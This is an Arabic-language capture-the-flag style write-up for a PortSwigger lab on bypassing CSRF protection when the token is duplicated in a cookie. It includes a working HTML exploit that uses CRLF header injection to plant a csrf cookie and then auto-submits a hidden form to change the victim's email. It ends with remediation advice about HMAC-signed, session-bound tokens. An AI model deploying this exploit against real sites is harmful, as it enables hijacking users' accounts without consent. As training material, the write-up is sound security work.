# [CSRF where token is duplicated in cookie](https://portswigger.net/web-security/csrf/bypassing-token-validation/lab-token-duplicated-in-cookie)

## **`الهدف`**
إنشاء كود `HTML` يقوم بعمل هجوم `CSRF` بحيث يغير الـ `email` الخاص بالضحية.
## **`خطوات الحل`**
**`نفس خطوات حل لاب` [CSRF where token is tied to non-session cookie](./CSRF-where-token-is-tied-to-non-session-cookie.md)

ولكن بما أن هذا اللاب يقوم بوضع الـ `csrf token` في الـ `cookie` وفي الـ `request` ويقارنهم سويًا دون العودة إلى السيرفر فكل ماعلينا فعله هو استعمال نفس السكريبت ولكن بتعديلات بسيطة
```html
<form method="POST" action="https://0a4c00b80381128480260388005400b7.web-security-academy.net/my-account/change-email"> 
    <input type="hidden" name="email" value="test@test.com"> 
    <input type="hidden" name="csrf" value="XcnguU2aGEmYYbSlvbaiTVlcZ5uI6Pjg"> 
</form> 
<img src="https://0a4c00b80381128480260388005400b7.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrf=XcnguU2aGEmYYbSlvbaiTVlcZ5uI6Pjg%3b%20SameSite=None" onerror="document.forms[0].submit()">
```
بعد ذلك نقوم بالضغط على `Store` ثم `Deliver exploit to victim` لننتهي من حل اللاب.
## **`ترقيع الثغرة`**
**`نفس ترقيع لاب` [CSRF where token is tied to non-session cookie](./CSRF-where-token-is-tied-to-non-session-cookie.md)

لكن بإختلاف أنه لا يوجد في هذا الاب `csrfkey` لذلك فالاختلاف هنا أنه:

يجب عدم الاعتماد على نمط `Double Submit Cookie` البسيط الذي يقارن الـ `Cookie` بالـ `Request Body` فقط.

وإذا كان من الضروري استخدام نمط `Double Submit Cookie` فيجب ألا يقبل السيرفر أي `Token` عشوائي يرسله المستخدم حيث يجب أن يكون الـ `CSRF Token` مشفراً وموقعاً بتقنية `HMAC` باستخدام مفتاح سري لا يملكه إلا السيرفر، وأن يتم دمج الـ `Session ID` الخاص بالمستخدم داخل الـ `Token` قبل تشفيره.
